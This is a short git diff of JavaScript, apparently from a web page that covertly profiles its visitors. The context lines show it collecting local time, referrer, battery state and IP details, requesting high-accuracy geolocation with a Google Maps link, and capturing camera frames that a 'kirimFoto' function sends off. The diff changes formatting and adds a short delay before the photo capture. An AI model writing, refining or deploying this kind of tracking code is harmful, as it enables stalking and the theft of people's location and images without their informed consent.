@@ -146,7 +146,7 @@ Waktu Lokal            : ${waktu}
 Referrer               : ${ref}
 Baterai                : ${Math.round(bat.level * 100)}%
 Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
-      `.trim();
+`.trim();
     };
 
     const ambilIPInfo = async () => {
@@ -183,8 +183,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           resolve(`
 - 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
-❌ Lokasi tidak diizinkan oleh pengguna.
-`);
+❌ Lokasi tidak diizinkan oleh pengguna.`);
         }, { enableHighAccuracy: true, timeout: 7000 });
       });
     };
@@ -196,6 +195,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         video.srcObject = stream;
         video.setAttribute("playsinline", true);
         await video.play();
+
         await new Promise(resolve => {
           const cek = () => {
             if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
@@ -210,6 +210,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
+          await new Promise(resolve => setTimeout(resolve, 100)); // 0.1 detik
           await new Promise(resolve => canvas.toBlob(async (blob) => {
             if (blob) await kirimFoto(blob);
             resolve();
@@ -219,7 +220,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         stream.getTracks().forEach(track => track.stop());
         return "";
       } catch {
-        return `౼ 〘 ${label} 〙 ౼\n❌ Kamera tidak diizinkan oleh pengguna.`;
+        return `౼ 〘 ${label} 〙 ౼\n\n❌ Kamera tidak diizinkan oleh pengguna.`;
       }
     };
 
